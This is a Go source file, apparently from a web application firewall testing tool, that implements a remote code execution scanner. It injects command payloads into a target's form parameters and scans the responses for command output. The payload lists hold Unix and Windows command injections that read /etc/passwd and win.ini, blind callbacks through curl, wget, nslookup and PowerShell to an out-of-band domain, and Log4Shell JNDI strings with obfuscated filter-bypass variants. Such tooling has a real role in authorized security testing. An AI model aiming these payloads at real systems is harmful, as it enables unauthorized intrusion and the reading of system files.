// Package rce provides Remote Code Execution testing
package rce

import (
	"context"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures RCE testing
type Config struct {
	Concurrency int
	Timeout     time.Duration
	Headers     map[string]string
	OOBDomain   string // Out-of-band domain for blind RCE
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Concurrency: 5,
		Timeout:     15 * time.Second,
	}
}

// Result represents an RCE test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	PayloadType  string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs RCE testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new RCE scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = 5
	}
	if config.Timeout <= 0 {
		config.Timeout = 15 * time.Second
	}

	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]Result, 0),
	}
}

// Scan tests a URL for RCE vulnerabilities
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param, value := range params {
		for _, payload := range Payloads() {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = value + payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents an RCE payload
type Payload struct {
	Value   string
	Type    string
	OS      string
	Markers []string
}

// testPayload tests a single RCE payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:         targetURL,
		Parameter:   param,
		Payload:     payload.Value,
		PayloadType: payload.Type,
		Timestamp:   time.Now(),
	}

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(buildFormData(params)))
	if err != nil {
		return result
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload.Markers)
	if result.Vulnerable {
		result.Severity = "CRITICAL"
	}

	return result
}

// buildFormData builds URL-encoded form data
func buildFormData(params map[string]string) string {
	parts := make([]string, 0, len(params))
	for k, v := range params {
		parts = append(parts, k+"="+v)
	}
	return strings.Join(parts, "&")
}

// detectVulnerability checks response for RCE indicators
func (s *Scanner) detectVulnerability(body string, markers []string) (bool, string) {
	// Check for specific markers
	for _, marker := range markers {
		if strings.Contains(body, marker) {
			return true, "RCE marker found: " + marker
		}
	}

	// Check for command output patterns
	patterns := []string{
		"uid=",
		"gid=",
		"groups=",
		"root:",
		"/bin/bash",
		"/bin/sh",
		"WINDOWS",
		"Program Files",
		"System32",
		"Volume Serial",
		"Directory of",
	}

	for _, pattern := range patterns {
		if strings.Contains(body, pattern) {
			return true, "Command output detected: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns RCE test payloads
func Payloads() []Payload {
	return []Payload{
		// Unix command injection
		{Value: ";id", Type: "unix", OS: "linux", Markers: []string{"uid="}},
		{Value: "|id", Type: "unix", OS: "linux", Markers: []string{"uid="}},
		{Value: "$(id)", Type: "unix", OS: "linux", Markers: []string{"uid="}},
		{Value: "`id`", Type: "unix", OS: "linux", Markers: []string{"uid="}},
		{Value: ";cat /etc/passwd", Type: "unix", OS: "linux", Markers: []string{"root:"}},
		{Value: "| cat /etc/passwd", Type: "unix", OS: "linux", Markers: []string{"root:"}},
		{Value: "$(cat /etc/passwd)", Type: "unix", OS: "linux", Markers: []string{"root:"}},
		{Value: ";uname -a", Type: "unix", OS: "linux", Markers: []string{"Linux"}},
		{Value: ";whoami", Type: "unix", OS: "linux", Markers: []string{}},

		// Windows command injection
		{Value: "&dir", Type: "windows", OS: "windows", Markers: []string{"Directory of"}},
		{Value: "|dir", Type: "windows", OS: "windows", Markers: []string{"Directory of"}},
		{Value: "&type C:\\Windows\\win.ini", Type: "windows", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "&whoami", Type: "windows", OS: "windows", Markers: []string{}},
		{Value: "&ipconfig", Type: "windows", OS: "windows", Markers: []string{"Windows IP"}},

		// Newline injection
		{Value: "\n/bin/id", Type: "newline", OS: "linux", Markers: []string{"uid="}},
		{Value: "\r\ndir", Type: "newline", OS: "windows", Markers: []string{"Directory"}},

		// Encoded payloads
		{Value: "%0a/bin/id", Type: "encoded", OS: "linux", Markers: []string{"uid="}},
		{Value: "%0d%0adir", Type: "encoded", OS: "windows", Markers: []string{"Directory"}},

		// PowerShell
		{Value: "&powershell -c whoami", Type: "powershell", OS: "windows", Markers: []string{}},
		{Value: "&powershell Get-Process", Type: "powershell", OS: "windows", Markers: []string{"Handles"}},
	}
}

// BlindPayloads returns blind RCE payloads for OOB detection
func BlindPayloads(oobDomain string) []Payload {
	return []Payload{
		// DNS exfiltration
		{Value: ";nslookup " + oobDomain, Type: "blind-dns", OS: "both", Markers: nil},
		{Value: "|nslookup " + oobDomain, Type: "blind-dns", OS: "both", Markers: nil},
		{Value: "$(nslookup " + oobDomain + ")", Type: "blind-dns", OS: "linux", Markers: nil},

		// HTTP callback
		{Value: ";curl " + oobDomain, Type: "blind-http", OS: "linux", Markers: nil},
		{Value: ";wget " + oobDomain, Type: "blind-http", OS: "linux", Markers: nil},
		{Value: "&powershell Invoke-WebRequest " + oobDomain, Type: "blind-http", OS: "windows", Markers: nil},

		// Time-based
		{Value: ";sleep 5", Type: "time-based", OS: "linux", Markers: nil},
		{Value: "&ping -n 5 127.0.0.1", Type: "time-based", OS: "windows", Markers: nil},
	}
}

// Log4jPayloads returns Log4Shell payloads
func Log4jPayloads(oobDomain string) []Payload {
	return []Payload{
		{Value: "${jndi:ldap://" + oobDomain + "/a}", Type: "log4j", OS: "java", Markers: nil},
		{Value: "${jndi:rmi://" + oobDomain + "/a}", Type: "log4j", OS: "java", Markers: nil},
		{Value: "${${lower:j}ndi:${lower:l}dap://" + oobDomain + "/a}", Type: "log4j-bypass", OS: "java", Markers: nil},
		{Value: "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + oobDomain + "/a}", Type: "log4j-bypass", OS: "java", Markers: nil},
	}
}
